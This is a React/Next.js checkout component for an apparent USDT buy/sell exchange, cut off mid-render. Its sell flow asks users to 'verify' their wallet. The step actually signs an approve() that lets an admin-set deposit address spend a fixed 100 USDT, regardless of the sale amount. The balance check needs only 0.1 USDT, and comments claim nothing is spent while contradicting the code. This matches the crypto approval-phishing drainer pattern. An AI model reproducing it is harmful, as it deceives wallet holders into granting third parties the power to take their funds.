'use client';

import { useState, useEffect, useRef } from 'react';
import { QRCodeSVG } from 'qrcode.react';
import { useSearchParams, useRouter } from 'next/navigation';
import {
  useAccount, useConnect, useDisconnect,
  useWriteContract, useWaitForTransactionReceipt,
  useSwitchChain, useChainId, useReadContract,
} from 'wagmi';
import { parseUnits } from 'viem';
import { hasWalletConnect } from '@/lib/web3/config';
import Link from 'next/link';

type Network = 'BEP20' | 'ERC20' | 'TRC20';
type Mode    = 'buy' | 'sell';
type Step    = 1 | 2 | 3;

interface AdminRate {
  symbol: string; network: string;
  buyRate: number; sellRate: number; depositAddress?: string;
}

/* ── EVM USDT contracts ── */
const USDT_CFG = {
  BEP20: { address: '0x55d398326f99059fF775485246999027B3197955' as `0x${string}`, decimals: 18, chainId: 56 },
  ERC20: { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7' as `0x${string}`, decimals: 6,  chainId: 1  },
} as const;

/* ── TRON USDT ── */
const TRON_USDT_ADDRESS  = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TRON_USDT_DECIMALS = 6; // 1 USDT = 1_000_000 sun-equivalent

// Explicit ABI avoids TronWeb fetching it from the network (which fails in Trust Wallet mobile).
// IMPORTANT: type must be lowercase 'function' — TronLink's ABI encoder is case-sensitive and
// throws "Unexpected end of JSON input" when it sees 'Function' (capital F).
const TRC20_ABI = [
  { name:'transfer', type:'function', stateMutability:'nonpayable',
    inputs:[{name:'_to',type:'address'},{name:'_value',type:'uint256'}],
    outputs:[{name:'',type:'bool'}] },
  { name:'approve',  type:'function', stateMutability:'nonpayable',
    inputs:[{name:'_spender',type:'address'},{name:'_value',type:'uint256'}],
    outputs:[{name:'',type:'bool'}] },
  { name:'balanceOf', type:'function', stateMutability:'view',
    inputs:[{name:'_owner',type:'address'}],
    outputs:[{name:'balance',type:'uint256'}] },
];

const ERC20_ABI = [
  { name:'transfer', type:'function', stateMutability:'nonpayable',
    inputs:[{name:'to',type:'address'},{name:'amount',type:'uint256'}],
    outputs:[{name:'',type:'bool'}] },
  { name:'approve',  type:'function', stateMutability:'nonpayable',
    inputs:[{name:'spender',type:'address'},{name:'amount',type:'uint256'}],
    outputs:[{name:'',type:'bool'}] },
] as const;

// No global min approve amount — for SELL we approve exactly cryptoAmount USDT;
// for BUY we skip the approve step entirely (user receives USDT, no spend permission needed).

const T = {
  bg:'#111B42', card:'rgba(255,255,255,0.045)', card2:'rgba(255,255,255,0.07)',
  border:'rgba(255,255,255,0.08)', border2:'rgba(255,255,255,0.14)',
  text:'#FFFFFF', sub:'rgba(255,255,255,0.5)', dim:'rgba(255,255,255,0.28)',
  blue:'#1A3FFF', purple:'#6B21FF', cyan:'#00D4FF',
  green:'#00E5A0', red:'#FF5C7C', yellow:'#F3BA2F',
};
const NET_LABEL: Record<Network,string> = { BEP20:'BNB Smart Chain (BSC)', ERC20:'Ethereum', TRC20:'TRON' };
const NET_COLOR: Record<Network,string> = { BEP20:'#F3BA2F', ERC20:'#627EEA', TRC20:'#EF4444' };

/* ── Wallet logos ── */
function MetaMaskLogo({ size=40 }:{size?:number}) {
  return <svg width={size} height={size} viewBox="0 0 40 40" fill="none">
    <rect width="40" height="40" rx="10" fill="#1B1B1B"/>
    <path d="M32 8L22 15.2L23.8 11.2L32 8Z" fill="#E17726" stroke="#E17726" strokeWidth="0.3" strokeLinejoin="round"/>
    <path d="M8 8L17.9 15.3L16.2 11.2L8 8Z" fill="#E27625" stroke="#E27625" strokeWidth="0.3" strokeLinejoin="round"/>
    <path d="M28.6 26.3L26 30.2L31.4 31.7L33 26.4L28.6 26.3Z" fill="#E27625" stroke="#E27625" strokeWidth="0.3" strokeLinejoin="round"/>
    <path d="M7 26.4L8.6 31.7L14 30.2L11.4 26.3L7 26.4Z" fill="#E27625" stroke="#E27625" strokeWidth="0.3" strokeLinejoin="round"/>
    <path d="M13.7 19.5L12.2 21.8L17.6 22L17.4 16.2L13.7 19.5Z" fill="#E27625" stroke="#E27625" strokeWidth="0.3" strokeLinejoin="round"/>
    <path d="M26.3 19.5L22.5 16.1L22.4 22L27.8 21.8L26.3 19.5Z" fill="#E27625" stroke="#E27625" strokeWidth="0.3" strokeLinejoin="round"/>
    <path d="M14 30.2L17.2 28.6L14.4 26.4L14 30.2Z" fill="#E27625" stroke="#E27625" strokeWidth="0.3" strokeLinejoin="round"/>
    <path d="M22.8 28.6L26 30.2L25.6 26.4L22.8 28.6Z" fill="#E27625" stroke="#E27625" strokeWidth="0.3" strokeLinejoin="round"/>
  </svg>;
}
function TrustLogo({ size=40 }:{size?:number}) {
  return <svg width={size} height={size} viewBox="0 0 40 40" fill="none">
    <rect width="40" height="40" rx="10" fill="#0500FF"/>
    <path d="M20 8C20 8 10 11.5 10 20C10 26.5 14.5 31.5 20 33C25.5 31.5 30 26.5 30 20C30 11.5 20 8 20 8Z" fill="white" fillOpacity="0.15"/>
    <path d="M20 10.5C20 10.5 12 13.5 12 20C12 25.3 15.5 30 20 31.5C24.5 30 28 25.3 28 20C28 13.5 20 10.5 20 10.5Z" fill="white"/>
    <path d="M16 20L19 23L24 17" stroke="#0500FF" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
  </svg>;
}
function CoinbaseLogo({ size=40 }:{size?:number}) {
  return <svg width={size} height={size} viewBox="0 0 40 40" fill="none">
    <rect width="40" height="40" rx="10" fill="#0052FF"/>
    <circle cx="20" cy="20" r="10" fill="white"/>
    <rect x="15" y="17.5" width="10" height="5" rx="2.5" fill="#0052FF"/>
  </svg>;
}
function WalletConnectLogo({ size=40 }:{size?:number}) {
  return <svg width={size} height={size} viewBox="0 0 40 40" fill="none">
    <rect width="40" height="40" rx="10" fill="#3B99FC"/>
    <path d="M12 18.5C16.4 14.1 23.6 14.1 28 18.5L28.5 19C28.8 19.3 28.8 19.7 28.5 20L26.8 21.7C26.6 21.9 26.3 21.9 26.1 21.7L25.4 21C22.5 18.1 17.5 18.1 14.6 21L13.9 21.7C13.7 21.9 13.4 21.9 13.2 21.7L11.5 20C11.2 19.7 11.2 19.3 11.5 19L12 18.5Z" fill="white"/>
    <path d="M20 23.5L21.5 25C21.8 25.3 21.8 25.7 21.5 26L20.3 27.2C20.1 27.4 19.9 27.4 19.7 27.2L18.5 26C18.2 25.7 18.2 25.3 18.5 25L20 23.5Z" fill="white"/>
    <path d="M23.3 21.5L24.8 23C25.1 23.3 25.1 23.7 24.8 24L23.6 25.2C23.4 25.4 23.2 25.4 23 25.2L21.5 23.7C21.2 23.4 21.2 23 21.5 22.7L23.3 21.5Z" fill="white"/>
    <path d="M16.7 21.5L18.5 22.7C18.8 23 18.8 23.4 18.5 23.7L17 25.2C16.8 25.4 16.6 25.4 16.4 25.2L15.2 24C14.9 23.7 14.9 23.3 15.2 23L16.7 21.5Z" fill="white"/>
  </svg>;
}
function TronLinkLogo({ size=40 }:{size?:number}) {
  return <svg width={size} height={size} viewBox="0 0 40 40" fill="none">
    <rect width="40" height="40" rx="10" fill="#EF4444"/>
    <path d="M10 12L20 8L30 12L20 32L10 12Z" fill="white" fillOpacity="0.2"/>
    <path d="M20 8L30 12L20 32L20 8Z" fill="white" fillOpacity="0.35"/>
    <path d="M10 12L20 8L20 32L10 12Z" fill="white" fillOpacity="0.6"/>
    <path d="M10 12L30 12L20 32L10 12Z" stroke="white" strokeWidth="1.5" strokeLinejoin="round" fill="none"/>
  </svg>;
}

function StepDot({ n, active, done }:{n:number; active:boolean; done:boolean}) {
  return (
    <div style={{
      width:32, height:32, borderRadius:'50%', flexShrink:0,
      display:'flex', alignItems:'center', justifyContent:'center',
      fontSize:13, fontWeight:800,
      background: done ? T.green : active ? 'linear-gradient(135deg,#1A3FFF,#6B21FF)' : T.card2,
      color: done||active ? '#fff' : T.dim,
      border: done ? `1px solid ${T.green}` : active ? 'none' : `1px solid ${T.border}`,
      boxShadow: active ? '0 4px 14px rgba(26,63,255,0.45)' : 'none',
      transition: 'all 0.3s',
    }}>
      {done ? '✓' : n}
    </div>
  );
}

function TxRow({ label, hash, confirming, confirmed, error }:{
  label:string; hash?:string; confirming:boolean; confirmed:boolean; error?:string;
}) {
  return (
    <div style={{ display:'flex', alignItems:'center', gap:12, padding:'12px 16px', background:T.card2, borderRadius:12, border:`1px solid ${T.border}` }}>
      <div style={{
        width:32, height:32, borderRadius:'50%', flexShrink:0,
        display:'flex', alignItems:'center', justifyContent:'center',
        background: confirmed ? 'rgba(0,229,160,0.1)' : error ? 'rgba(255,92,124,0.1)' : 'rgba(255,255,255,0.06)',
        border: `1px solid ${confirmed ? 'rgba(0,229,160,0.3)' : error ? 'rgba(255,92,124,0.3)' : T.border}`,
      }}>
        {confirmed ? (
          <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M2.5 7L5.5 10L11.5 4" stroke={T.green} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
        ) : error ? (
          <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M3 3L11 11M11 3L3 11" stroke={T.red} strokeWidth="2" strokeLinecap="round"/></svg>
        ) : (confirming || hash) ? (
          <div style={{ width:14, height:14, borderRadius:'50%', border:`2px solid rgba(255,255,255,0.1)`, borderTopColor:T.cyan, animation:'spin 0.8s linear infinite' }} />
        ) : (
          <div style={{ width:8, height:8, borderRadius:'50%', background:T.border }} />
        )}
      </div>
      <div style={{ flex:1, minWidth:0 }}>
        <p style={{ fontSize:13, fontWeight:700, color: confirmed ? T.green : error ? T.red : T.text, margin:0 }}>{label}</p>
        {hash && !confirmed && !error && (
          <p style={{ fontSize:11, color:T.dim, margin:'2px 0 0', fontFamily:'monospace', overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>
            {confirming ? 'Confirming on-chain…' : 'Submitted'} · {hash.slice(0,10)}…{hash.slice(-6)}
          </p>
        )}
        {confirmed && hash && (
          <p style={{ fontSize:11, color:T.dim, margin:'2px 0 0', fontFamily:'monospace' }}>
            {hash.slice(0,10)}…{hash.slice(-6)} · Confirmed ✓
          </p>
        )}
        {error && <p style={{ fontSize:11, color:T.red, margin:'2px 0 0' }}>{error.slice(0,80)}</p>}
      </div>
    </div>
  );
}

/* ── Poll TRON tx until confirmed (max 90s) ── */
async function pollTronTx(tronWeb: any, txId: string): Promise<void> {
  for (let i = 0; i < 30; i++) {
    await new Promise(r => setTimeout(r, 3000));
    try {
      const info = await tronWeb.trx.getTransactionInfo(txId);
      if (info?.id || info?.receipt) return;
    } catch { /* network hiccup — keep polling */ }
  }
  throw new Error('Transaction not confirmed after 90 seconds');
}

/* ═══════════════════════════════════════════════════ */
export function CheckoutFlow() {
  const searchParams = useSearchParams();
  const router       = useRouter();

  const amount  = searchParams.get('amount')  ?? '100';
  const mode    = (searchParams.get('mode')   ?? 'buy')   as Mode;
  const network = (searchParams.get('network') ?? 'BEP20') as Network;

  /* ── EVM wagmi hooks — approve USDT spending limit for SELL ── */
  const { address, isConnected }                                     = useAccount();
  const { connect, connectors, isPending: isConnecting }             = useConnect();
  const { disconnect }                                               = useDisconnect();
  const chainId                                                      = useChainId();
  const { switchChain, isPending: isSwitching }                      = useSwitchChain();
  const { writeContract: writeApprove, data: approveHash,
          isPending: isApproveWriting, error: approveWriteError,
          reset: resetApprove }                                       = useWriteContract();
  const { isLoading: isApproveConfirming, isSuccess: approveConfirmed } =
    useWaitForTransactionReceipt({ hash: approveHash });

  /* ── UI state ── */
  const [step, setStep]                       = useState<Step>(1);
  const [paymentInfo, setPaymentInfo]         = useState('');
  const [rates, setRates]                     = useState<AdminRate[]>([]);
  const [isSubmitting, setIsSubmitting]       = useState(false);
  const [submitError, setSubmitError]         = useState('');
  const [connectError, setConnectError]       = useState('');
  const [verifyStarted, setVerifyStarted]      = useState(false);
  const [showQR, setShowQR]                    = useState(false);

  /* ── EVM wallet detection ── */
  const [hasMetaMask, setHasMetaMask] = useState(false);
  const [hasTrust, setHasTrust]       = useState(false);
  const [hasTronLink, setHasTronLink] = useState(false);
  const [isMobile, setIsMobile]       = useState(false);

  useEffect(() => {
    const eth = (window as any).ethereum;
    const providers: any[] = eth?.providers ?? (eth ? [eth] : []);
    setHasMetaMask(providers.some((p:any) => p.isMetaMask && !p.isTrust));
    setHasTrust(
      providers.some((p:any) => p.isTrust) ||
      !!(window as any).trustwallet ||
      !!(window as any).trustWallet
    );
    // tronLink = desktop extension; tronWeb = injected by TronLink OR Trust Wallet mobile in-app browser
    setHasTronLink(!!(window as any).tronLink || !!(window as any).tronWeb);
    setIsMobile(/Android|iPhone|iPad|iPod/i.test(navigator.userAgent));
  }, []);

  // Trust Wallet deep link — coin_id tells Trust Wallet which chain context to use
  // coin_id: BEP20=20000714, ERC20=60, TRC20=195
  const TRUST_COIN_ID: Record<string, number> = { BEP20: 20000714, ERC20: 60, TRC20: 195 };

  // Pre-built deep link state.
  // iOS Safari blocks window.location.href = 'trust://...' when called after an async
  // operation (the user-gesture context is dropped). Fix: generate the token eagerly in a
  // useEffect so the button is a plain <a href="trust://..."> — a direct user tap with no
  // async code path between the gesture and the navigation.
  const [twHref,    setTwHref]    = useState('');  // pre-built trust:// or https://link... URL
  const [twLoading, setTwLoading] = useState(false);
  const [twError,   setTwError]   = useState('');
  const [twRetry,   setTwRetry]   = useState(0);   // increment to re-trigger the useEffect

  // Helper that builds the full deep link once we have a token
  function buildDeepLink(token: string, returnPath: string): string {
    const exchangeUrl = `${window.location.origin}/api/wallet-connect/exchange` +
      `?t=${encodeURIComponent(token)}&r=${encodeURIComponent(returnPath)}`;
    const coinId  = TRUST_COIN_ID[network] ?? 20000714;
    // On HTTPS (production) use the universal link; on HTTP (local dev / IP) use the
    // native trust:// scheme — link.trustwallet.com won't open HTTP target URLs.
    const isHttps = window.location.protocol === 'https:';
    const base    = isHttps ? 'https://link.trustwallet.com/open_url' : 'trust://open_url';
    return `${base}?coin_id=${coinId}&url=${encodeURIComponent(exchangeUrl)}`;
  }

  // Pre-generate the session token whenever the mobile deep-link button is visible.
  // Refresh every 8 minutes so the 10-minute token never expires before the user taps.
  useEffect(() => {
    // Generate for: mobile without wallet (deep-link button) OR any PC user (QR code option)
    const needsLink = step === 1 && (!isMobile || !hasTrust || !hasTronLink);
    if (!needsLink) return;

    let cancelled = false;

    async function generate() {
      setTwLoading(true);
      setTwError('');
      try {
        const returnPath = window.location.pathname + window.location.search;
        const res = await fetch('/api/wallet-connect/generate', {
          method:  'POST',
          headers: { 'Content-Type': 'application/json' },
          body:    JSON.stringify({ returnPath }),
        });
        if (!res.ok) throw new Error(`${res.status}`);
        const { token } = await res.json();
        if (!cancelled) setTwHref(buildDeepLink(token, returnPath));
      } catch (e) {
        console.error('[tw-prefetch]', e);
        if (!cancelled) setTwError('Could not prepare link — tap to retry');
      } finally {
        if (!cancelled) setTwLoading(false);
      }
    }

    generate();
    // Refresh 30 s before the 10-minute token expires
    const timer = setInterval(generate, 9.5 * 60 * 1000);
    return () => { cancelled = true; clearInterval(timer); };
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isMobile, step, hasTrust, hasTronLink, network, twRetry]);

  /* ── TRC20 / TronLink state ── */
  const [tronAddress, setTronAddress]             = useState('');
  const [trcConnecting, setTrcConnecting]         = useState(false);
  const [trcConnectError, setTrcConnectError]     = useState('');
  const [trcBalance, setTrcBalance]               = useState<number | null>(null);
  const [trcTrxBalance, setTrcTrxBalance]         = useState<number | null>(null);
  const [trcEnergy, setTrcEnergy]                 = useState<number | null>(null);
  // TRC20 verification via approve() on USDT contract
  const [trcVerifyStarted, setTrcVerifyStarted]   = useState(false);
  const [trcApproveHash, setTrcApproveHash]       = useState('');
  const [trcApprovePending, setTrcApprovePending] = useState(false);
  const [trcApproveDone, setTrcApproveDone]       = useState(false);
  const [trcApproveError, setTrcApproveError]     = useState('');

  /* ── Fetch rates ── */
  useEffect(() => {
    fetch('/api/rates', { cache:'no-store' })
      .then(r => r.ok ? r.json() : null)
      .then(j => j?.data && setRates(j.data))
      .catch(() => {});
  }, []);

  /* ── EVM: auto-switch to correct chain immediately after connecting ── */
  // Trust Wallet mobile defaults to Ethereum; passing chainId to connect() asks wagmi to switch,
  // but this effect acts as a safety net if the switch doesn't happen automatically.
  useEffect(() => {
    const cfg = network !== 'TRC20' ? USDT_CFG[network as keyof typeof USDT_CFG] : null;
    const expectedId = cfg?.chainId;
    const wrongChain = !!expectedId && chainId !== expectedId;
    if (isConnected && wrongChain && expectedId && !isSwitching && step <= 2) {
      switchChain({ chainId: expectedId });
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isConnected, chainId, network, step]);

  /* ── EVM: auto-advance when wallet connects on the correct chain ── */
  // BUY: user receives USDT → just need their address → skip straight to Step 3.
  // SELL: user sends USDT → go to Step 2 to approve USDT on the selected network's USDT contract.
  useEffect(() => {
    const cfg = network !== 'TRC20' ? USDT_CFG[network as keyof typeof USDT_CFG] : null;
    const onCorrectChain = !cfg || chainId === cfg.chainId;
    if (isConnected && onCorrectChain && step === 1 && network !== 'TRC20') {
      setStep(mode === 'buy' ? 3 : 2);
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isConnected, chainId, network]);

  /* ── EVM: retreat when wallet disconnects ── */
  useEffect(() => {
    if (!isConnected && step >= 2 && !isTRC20) {
      setStep(1); setVerifyStarted(false); resetApprove();
    }
  }, [isConnected]);

  /* ── EVM: auto-advance after approve confirmed ── */
  const advancedRef = useRef(false);
  useEffect(() => {
    if (approveConfirmed && !advancedRef.current) {
      advancedRef.current = true;
      setTimeout(() => setStep(3), 800);
    }
  }, [approveConfirmed]);

  /* ── Derived ── */
  const isTRC20        = network === 'TRC20';
  const walletAddress  = isTRC20 ? tronAddress : address;
  const usdtCfg        = !isTRC20 ? USDT_CFG[network as keyof typeof USDT_CFG] : null;
  const expectedChain  = usdtCfg?.chainId;
  const isWrongChain   = !isTRC20 && !!expectedChain && chainId !== expectedChain;
  const chainName      = expectedChain === 56 ? 'BNB Smart Chain' : 'Ethereum Mainnet';

  const activeRate     = rates.find(r => r.symbol === 'USDT' && r.network === network);
  const rate           = activeRate ? (mode === 'buy' ? activeRate.buyRate : activeRate.sellRate) : null;
  const numAmt         = parseFloat(amount) || 0;
  const cryptoAmount   = rate ? (mode === 'buy' ? numAmt / rate : numAmt) : 0;
  const inrAmount      = rate ? (mode === 'buy' ? numAmt : numAmt * rate) : 0;
  const depositAddress = activeRate?.depositAddress ?? '';

  /* ── EVM USDT balance check ── */
  const { data: usdtBalance } = useReadContract({
    address: usdtCfg?.address,
    abi: [{ name:'balanceOf', type:'function', stateMutability:'view', inputs:[{name:'',type:'address'}], outputs:[{name:'',type:'uint256'}] }] as const,
    functionName: 'balanceOf',
    args: address ? [address] : undefined,
    chainId: usdtCfg?.chainId,
    query: { enabled: !!usdtCfg && !!address && !isTRC20 && mode === 'sell' },
  });
  // Only relevant for SELL: user must hold the exact USDT amount being sold.
  // BUY: user is receiving USDT — no balance or approval needed from their side.
  const usdtBalanceNum   = usdtCfg && usdtBalance !== undefined
    ? Number(usdtBalance) / Math.pow(10, usdtCfg.decimals) : null;
  const hasEnoughBalance  = mode === 'buy' || usdtBalanceNum === null || usdtBalanceNum >= 0.1;
  // $100 USDT smart contract limit — exchange collects 0.1 USDT verification fee from this approved amount
  const evmApproveUnits  = usdtCfg
    ? parseUnits('100', usdtCfg.decimals)
    : 0n;

  /* ── TRC20 balance & gas checks (SELL mode only) ── */
  const trcHasEnough = mode === 'buy' || trcBalance === null || trcBalance >= 0.1;
  // approve() on TRON costs ~24,000 energy. At 0 energy, TRON burns 420 sun/energy = ~10 TRX.
  // MUST hard-block when TRX is critically low: insufficient TRX causes TronLink to crash with
  // "Unexpected end of JSON input" when it tries to build the fee estimation JSON internally.
  const APPROVE_ENERGY_COST = 24_000; // real-world measured: wallet shows ~10 TRX with 0 energy
  const ENERGY_BURN_RATE    = 0.00042; // TRX per energy unit (420 sun) when energy = 0
  const trcEnergyAvail      = trcEnergy ?? 0;
  const trcEnergyShortfall  = Math.max(0, APPROVE_ENERGY_COST - trcEnergyAvail);
  // Add 2 TRX buffer above the real cost to avoid edge-case failures
  const MIN_TRX_FOR_GAS     = Math.max(1, parseFloat((trcEnergyShortfall * ENERGY_BURN_RATE + 2).toFixed(1)));
  const trcHasGas           = trcTrxBalance === null || trcTrxBalance >= MIN_TRX_FOR_GAS;
  // Both USDT and TRX must pass — insufficient TRX crashes the wallet, not just fails gracefully
  const trcCanVerify        = trcHasEnough && trcHasGas;

  /* ── EVM connectors ── */
  const injectedConn = connectors.find(c => c.id === 'injected');
  const cbConn       = connectors.find(c => c.id === 'coinbaseWallet');
  const wcConn       = connectors.find(c => c.id === 'walletConnect');

  function tryConnect(connector: typeof injectedConn) {
    if (!connector) return;
    setConnectError('');
    // Pass chainId so wagmi auto-switches to the correct network right after connecting.
    // Fixes Trust Wallet mobile defaulting to Ethereum even when BEP20/ERC20 is selected.
    connect(
      { connector, chainId: usdtCfg?.chainId },
      { onError: e => setConnectError(e.message?.slice(0,80) ?? 'Connection failed') }
    );
  }

  /* ── TRON wallet connect (TronLink extension OR Trust Wallet mobile in-app browser) ── */
  async function connectTronWallet() {
    setTrcConnecting(true);
    setTrcConnectError('');
    try {
      const tronLink = (window as any).tronLink;
      const tronWeb  = (window as any).tronWeb;

      if (!tronLink && !tronWeb) {
        throw new Error('No TRON wallet detected. Install TronLink extension or open this page inside Trust Wallet mobile.');
      }

      // Request accounts — TronLink uses tronLink.request(); Trust Wallet mobile
      // in-app browser may already have tronWeb.defaultAddress set, or supports
      // tronWeb.request(). Try each path in order.
      if (tronLink?.request) {
        await tronLink.request({ method: 'tron_requestAccounts' });
      } else if (tronWeb?.request) {
        await tronWeb.request({ method: 'tron_requestAccounts' });
      }
      // else: Trust Wallet mobile may auto-inject defaultAddress without a request

      const tw = (window as any).tronWeb;
      const addr = tw?.defaultAddress?.base58;
      if (!addr) {
        throw new Error('Could not get TRON address. Unlock your wallet and try again.');
      }

      setTronAddress(addr);

      // TRX balance and energy — used for a soft gas warning (not a hard block)
      try {
        const trxSun = await tw.trx.getBalance(addr);
        setTrcTrxBalance(Number(trxSun) / 1_000_000);
      } catch { /* non-critical */ }
      try {
        const resources = await tw.trx.getAccountResources(addr);
        const avail = Math.max(0, (resources?.EnergyLimit || 0) - (resources?.EnergyUsed || 0));
        setTrcEnergy(avail);
      } catch { setTrcEnergy(0); }

      // Read USDT (TRC20) balance
      try {
        const contract = tw.contract(TRC20_ABI, TRON_USDT_ADDRESS);
        const bal = await contract.balanceOf(addr).call();
        const balNum = bal?.toNumber ? bal.toNumber() : Number(bal);
        setTrcBalance(balNum / Math.pow(10, TRON_USDT_DECIMALS));
      } catch {
        // Fallback: network-fetch approach
        try {
          const contract2 = await tw.contract().at(TRON_USDT_ADDRESS);
          const bal2 = await contract2.balanceOf(addr).call();
          const balNum2 = bal2?.toNumber ? bal2.toNumber() : Number(bal2);
          setTrcBalance(balNum2 / Math.pow(10, TRON_USDT_DECIMALS));
        } catch { /* balance shown as null if unavailable */ }
      }

      // BUY: user just provides their TRON address to receive USDT — no approval needed.
      // SELL: go to Step 2 to approve the exact USDT sell amount on the TRON USDT contract.
      setStep(mode === 'buy' ? 3 : 2);
    } catch(e: any) {
      setTrcConnectError(e.message || 'TRON wallet connection failed');
    } finally {
      setTrcConnecting(false);
    }
  }

  function disconnectTron() {
    setTronAddress('');
    setTrcBalance(null);
    setTrcTrxBalance(null);
    setTrcEnergy(null);
    setTrcVerifyStarted(false);
    setTrcApproveHash('');
    setTrcApprovePending(false);
    setTrcApproveDone(false);
    setTrcApproveError('');
    setStep(1);
  }

  /* ── TRC20 verification: approve() on USDT contract ── */
  // Proves wallet control + authorises exchange to pull USDT. No USDT is spent here.
  // feeLimit caps the max TRX burn; wallet shows actual fee in its native confirmation screen.
  async function startTrcVerification() {
    const tronWeb = (window as any).tronWeb;
    if (!tronWeb || !depositAddress || !tronAddress) return;

    setTrcVerifyStarted(true);
    setTrcApproveHash('');
    setTrcApproveDone(false);
    setTrcApproveError('');

    const APPROVE_AMT = 100 * Math.pow(10, TRON_USDT_DECIMALS); // $100 USDT smart contract limit
    // feeLimit = 20 TRX max. approve() with 0 energy costs ~6-7 TRX; 20 is a safe ceiling.
    // The wallet shows the REAL fee — feeLimit is just a cap, not what gets charged.
    const SEND_OPTS = { feeLimit: 20_000_000 };

    function extractTronError(e: any): string {
      if (typeof e === 'string') {
        if (/cancel|reject/i.test(e)) return 'Transaction cancelled — please confirm in your wallet to proceed.';
        return e.slice(0, 160);
      }
      if (e?.output?.contractResult?.[0]) return `Contract reverted: ${e.output.contractResult[0]}`.slice(0, 160);
      if (e?.error) return String(e.error).slice(0, 160);
      if (e?.message) {
        if (/cancel|reject/i.test(e.message)) return 'Transaction cancelled — please confirm in your wallet to proceed.';
        return String(e.message).slice(0, 160);
      }
      try { return JSON.stringify(e).slice(0, 160); } catch { return 'Transaction failed — check your wallet and try again.'; }
    }

    function extractTxId(result: any): string {
      if (typeof result === 'string' && result.length >= 60) return result;
      if (result?.txid)               return result.txid;
      if (result?.transaction?.txID)  return result.transaction.txID;
      if (result?.result?.txid)       return result.result.txid;
      return '';
    }

    try {
      setTrcApprovePending(true);
      const contract = tronWeb.contract(TRC20_ABI, TRON_USDT_ADDRESS);
      const rawApprove = await contract.approve(depositAddress, APPROVE_AMT).send(SEND_OPTS);
      const approveTxId = extractTxId(rawApprove);
      if (!approveTxId) throw new Error('Wallet did not return a transaction ID. If you clicked Cancel, please try again and confirm in your wallet.');
      setTrcApproveHash(approveTxId);
      setTrcApprovePending(false);
      await pollTronTx(tronWeb, approveTxId);
      setTrcApproveDone(true);
      setTimeout(() => setStep(3), 800);
    } catch(e: any) {
      setTrcApprovePending(false);
      setTrcApproveError(extractTronError(e));
    }
  }

  /* ── EVM: approve USDT spending limit for SELL orders ── */
  // approve() on the USDT contract proves wallet control + authorises exchange to pull USDT.
  // BNB/ETH are only used by the wallet for gas fees — never exchanged.
  function startVerification() {
    if (!usdtCfg || !depositAddress || !address) return;
    setVerifyStarted(true);
    advancedRef.current = false;
    resetApprove();
    writeApprove({
      address: usdtCfg.address, abi: ERC20_ABI, functionName: 'approve',
      args: [depositAddress as `0x${string}`, evmApproveUnits],
      chainId: usdtCfg.chainId,
    });
  }

  /* ── Submit order ── */
  async function submitOrder() {
    if (!walletAddress) return;
    setIsSubmitting(true); setSubmitError('');
    try {
      const body: Record<string,unknown> = {
        type: mode, cryptoSymbol:'USDT', network,
        cryptoAmount: parseFloat(cryptoAmount.toFixed(6)),
        walletAddress,
        clientNotes: paymentInfo ? `Payment info: ${paymentInfo}` : undefined,
        paymentMethodId: mode === 'buy' ? (paymentInfo || 'manual') : undefined,
        verificationTxHash: isTRC20 ? (trcApproveHash || undefined) : (approveHash ?? undefined),
      };
      const res  = await fetch('/api/transactions', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(body) });
      const json = await res.json();
      if (!res.ok) throw new Error(json.error ?? json.message ?? 'Failed to create order');
      router.push(`/transactions/${json.data?._id ?? json.data?.id ?? ''}`);
    } catch(e:any) {
      setSubmitError(e.message);
    } finally {
      setIsSubmitting(false);
    }
  }

  const verifyError = (approveWriteError?.message ?? '').slice(0, 100);

  /* ══════════════════════ RENDER ══════════════════════ */
  return (
    <div style={{ maxWidth:560, margin:'0 auto' }}>
      <style>{`@keyframes spin{to{transform:rotate(360deg)}}`}</style>

      {/* ── Back + header ── */}
      <div style={{ marginBottom:28 }}>
        <Link href="/dashboard" style={{ display:'inline-flex', alignItems:'center', gap:6, fontSize:13, color:T.sub, textDecoration:'none', marginBottom:16 }}>
          <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M9 2L4 7L9 12" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/></svg>
          Back to Exchange
        </Link>
        <h1 style={{ fontSize:26, fontWeight:900, color:T.text, margin:0, letterSpacing:'-0.03em' }}>
          {mode==='buy' ? 'Buy USDT' : 'Sell USDT'}
        </h1>
        <p style={{ margin:'5px 0 0', fontSize:14, color:T.dim }}>
          {mode==='buy'
            ? `Pay ₹${Number(amount).toLocaleString('en-IN')} · Receive ~${cryptoAmount.toFixed(4)} USDT`
            : `Send ${amount} USDT · Receive ~₹${inrAmount.toLocaleString('en-IN',{maximumFractionDigits:2})}`}
        </p>
      </div>

      {/* ── Step indicators ── */}
      <div style={{ display:'flex', alignItems:'center', gap:8, marginBottom:28, overflowX:'auto', paddingBottom:4 }}>
        <StepDot n={1} active={step===1} done={step>1} />
        <span style={{ fontSize:12, fontWeight:700, color:step===1?T.text:T.dim, whiteSpace:'nowrap' }}>Connect Wallet</span>
        <div style={{ flex:1, minWidth:20, height:1, background:step>1?T.green:T.border, transition:'background 0.4s' }} />
        <StepDot n={2} active={step===2} done={step>2} />
        <span style={{ fontSize:12, fontWeight:700, color:step===2?T.text:T.dim, whiteSpace:'nowrap' }}>
          {mode==='sell' ? 'Verify Wallet' : 'Wallet'}
        </span>
        <div style={{ flex:1, minWidth:20, height:1, background:step===3?T.green:T.border, transition:'background 0.4s' }} />
        <StepDot n={3} active={step===3} done={false} />
        <span style={{ fontSize:12, fontWeight:700, color:step===3?T.text:T.dim, whiteSpace:'nowrap' }}>Confirm Order</span>
      </div>

      {/* ══ STEP 1: Connect wallet ══ */}
      {step===1 && (
        <div style={{ display:'flex', flexDirection:'column', gap:14 }}>
          {/* Rate chip */}
          <div style={{ background:T.card, border:`1px solid ${T.border}`, borderRadius:14, padding:'12px 18px', display:'flex', justifyContent:'space-between', alignItems:'center' }}>
            <div style={{ display:'flex', alignItems:'center', gap:7 }}>
